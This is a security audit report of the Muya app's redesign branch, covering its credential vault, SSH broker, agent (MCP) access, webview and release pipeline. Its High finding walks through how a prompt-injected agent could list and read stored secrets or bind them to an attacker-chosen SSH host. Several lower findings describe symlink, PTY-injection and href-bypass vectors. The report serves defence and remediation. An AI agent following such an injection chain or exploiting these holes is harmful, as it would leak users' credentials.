# Security audit — Muya (2026-10-09)

Six parallel read-only reviews ran on `feat/ui-redesign-v0.4` @ b811a59:
1. Rust dependencies
2. npm dependencies
3. Auth and secrets
4. Injection and input validation
5. Frontend
6. Build, release and updater

The two High findings reported by the reviewers were re-checked by hand in the code. One was confirmed (H1). The other was downgraded (L1).

## Executive summary

| Critical | High | Medium | Low | Info |
|---|---|---|---|---|
| 0 | 1 | 5 | 11 | 4 |

**Overall risk: Medium.**
- No known-vulnerable dependency ships in the macOS app.
- The crypto stack is current.
- The main risk is design-level: a local agent, or a prompt-injected one, can obtain any stored secret while the vault is unlocked. This needs a product decision (P0).

## Trust model used
| Caller | Trust |
|---|---|
| Webview (operator UI) | trusted, behind a strict CSP |
| Agent via broker socket (MCP) | semi-trusted, because it can be prompt-injected |
| Paired remote Mac | untrusted |

## High

**H1 — Any agent can obtain any stored secret while the vault is unlocked.** Confirmed by hand.
- **Path 1, direct read:** `broker.rs:766` `get_secret` returns the plaintext value. The only gate is that the store is unlocked; this is a deliberate exception.
- **Path 2, indirect:** `ssh.rs:367` `agent_add_server_in`, then `check_agent_target` (`ssh.rs:567`). For a direct (non-PSMP) server, any host is accepted, and `agent_credential_source` (`ssh.rs:627`) binds any stored secret by name. `ssh_run` or `ssh_open` then types that secret into the password prompt of a host the agent chose.
- **Scenario:** an agent reads a poisoned file or web page. It calls `list_secrets`, then `get_secret` or `ssh_add_server(host=attacker, credential=X)` + `ssh_run`. Every secret leaves the machine. There is no per-secret consent and no prompt on screen.
- **Fix (needs operator decision):**
  - **Per-secret flag:** add an "agent may use / may read" flag to each secret, default off for reading.
  - **Approval prompt:** show an in-app approval for `get_secret` and for any agent add or update that binds a credential to a new host.
  - **Host pinning:** pin the bound host at binding time.

## Medium

| ID | Finding | Where | Fix |
|---|---|---|---|
| M1 | `send_to_session` with `deliver:"keys"`/`"muya"` writes agent bytes raw into another session's PTY (ESC, CR, bracketed paste). A low-privilege session can answer another session's permission prompt. | broker.rs:1239-1283 | Sanitize like `bridge_mcp::sanitize`. Allow keys only from a fixed set (y/n/digits/Enter) or behind an opt-in. |
| M2 | scp workspace guard: `-r` follows symlinks inside the uploaded folder (`ln -s ~/.ssh ws/x`). There is also a check-then-use window while the CyberArk fetch runs. | local_guard.rs:44-73, broker.rs:1688 | Walk with lstat and refuse symlinks in `-r` uploads. Re-check right before spawning. |
| M3 | `install_skill` clones any https git URL scraped from skillsmp.com. Skills can ship scripts. | fs.rs:1383, 1281 | Allowlist github.com, show the repo before installing, record the commit. |
| M4 | The pairing listener accepts exactly one connection. Any LAN host that connects first burns the PIN (DoS). The listener also uses a raw-pointer cast to reach state. | bridge_remote.rs:1249-1262 | Keep accepting until success or TTL, rate-limit per IP, and use the managed state handle. |
| M5 | Broker socket directory from `MUYA_SSH_BROKER_SOCK`: the 0700 chmod ignores errors, and live-check → remove → bind is racy. | broker.rs:490-499 | Verify that the parent is owned by this uid with mode 0700, else refuse. |

## Low

| ID | Finding | Where |
|---|---|---|
| L1 | PIN attempt counter is dead code: `validate_pin` is never called on the pairing path. Reported as High; downgraded after review. The listener allows one PAKE per PIN and marks the PIN used, and a wrong-PIN MITM cannot know the session key, so it cannot match the 24-bit SAS. Remove or wire the counter. | bridge_remote.rs:2025 |
| L2 | Legacy `MarkdownViewer.safeHref` can be bypassed with a tab or newline inside `javascript:`. CSP blocks execution, so it is a navigation risk only. Strip control characters or move to the `marked`+DOMPurify path. | MarkdownViewer.tsx:~18 |
| L3 | `opener:default` grants open_url and open_path broadly. Scope it to http/https/mailto plus the needed paths. | capabilities/default.json |
| L4 | `claude -p <q>` from a remote peer: q may start with `-`. Insert `--`. | bridge_exec.rs:~946 |
| L5 | `set_workspace_roots` accepts `/` or `$HOME`, which would widen the scp guard to `~/.ssh`. Reject them on the Rust side. | workspace_roots.rs:30 |
| L6 | Broker reads lines with no length cap, allowing a memory DoS from a same-uid process. | broker.rs |
| L7 | CyberArk `base_url` is not forced to https, and `auth_method` is interpolated into the path unvalidated (operator-set only). | cyberark.rs:182 |
| L8 | Remote exec sandbox is only a temp cwd and a stripped env. An approved argv can read absolute paths. Show the full argv on approval; consider `sandbox-exec`. | bridge_exec.rs:414 |
| L9 | On lock, decrypted credential copies may stay on the heap; only the key is zeroized. | credstore.rs:375 |
| L10 | CI actions pinned by tag, not SHA; no `permissions:` block. No secrets are used. | .github/workflows/ci.yml |
| L11 | `vendor/smart-connections-mcp` (local dev helper, not bundled) has unpinned Python deps that resolve to versions with High CVEs (torch, python-multipart, transformers). Pin the minimums. | vendor/smart-connections-mcp/requirements.txt |

## Info
- **I1:** `glib` 0.18.5 has a Medium advisory (RUSTSEC-2024-0429). It is reached via gtk3, which is Linux-only, so it is not in the macOS build.
- **I2:** Seven unmaintained transitive crates come from Tauri (fxhash, proc-macro-error, unic-*). Revisit on the next Tauri bump.
- **I3:** `source-map-js` 1.2.1 has a High advisory but is a dev dependency only; `npm update` fixes it.
- **I4:** `npm audit` could not run because of a TLS "unable to get local issuer certificate" error. Only osv-scanner data covers npm.

## Dependency tables
| Ecosystem | Scanner | Shipped vulns |
|---|---|---|
| Rust (686 crates) | osv-scanner | 0 |
| npm (316 packages) | osv-scanner (npm audit blocked by TLS) | 0 in prod; 1 High in dev |
| Crypto | — | rustls 0.23.45, ring 0.17.14, aes-gcm 0.10.3, argon2 0.5.3, curve25519-dalek 4.1.3, spake2-conflux 0.6.0: no advisories |

## Positive findings
- **Secret storage:** Argon2id (46 MiB, t=3) and AES-256-GCM, key held as `Zeroizing`. The vault is written atomically at 0600. The askpass FIFO is 0600 inside a 0700 directory.
- **Broker socket:** 0600, with a `getpeereid` uid check.
- **Process spawning:** every process uses argv vectors; the only `sh -c` calls run constant scripts.
- **ssh argument injection:** host and user starting with `-` are rejected, and `--` precedes the destination. The scp flag allowlist is applied, and agent `ssh_options` are forced off.
- **agent_ops:** `env_clear`, absolute program path, no shell, timeout and output cap.
- **Bridge text:** `bridge_mcp::sanitize` strips escape and control sequences. The bridge never binds a wildcard address.
- **Webview hardening:**
  - CSP is `script-src 'self'` with no eval.
  - No `shell`, `fs` or `http` capabilities, and no remote IPC.
  - DOMPurify sanitizes markdown.
  - The mock layer is unreachable in release builds.
- **Release pipeline:**
  - The updater is signature-verified (minisign pubkey) over HTTPS.
  - The app ships with hardened runtime (verified with `codesign -dv`: `flags=0x10000(runtime)`), notarized and stapled.
  - No secrets in git history, and no release artifacts tracked.
  - The plugin ships a local skill only.

## Remediation priority
| P | Items |
|---|---|
| P0 | H1 (operator decision on the secret-access model) |
| P1 | M1, M2, M3 |
| P2 | M4, M5, L2, L3, L4, L5 |
| P3 | L1, L6–L11, I2–I4 |
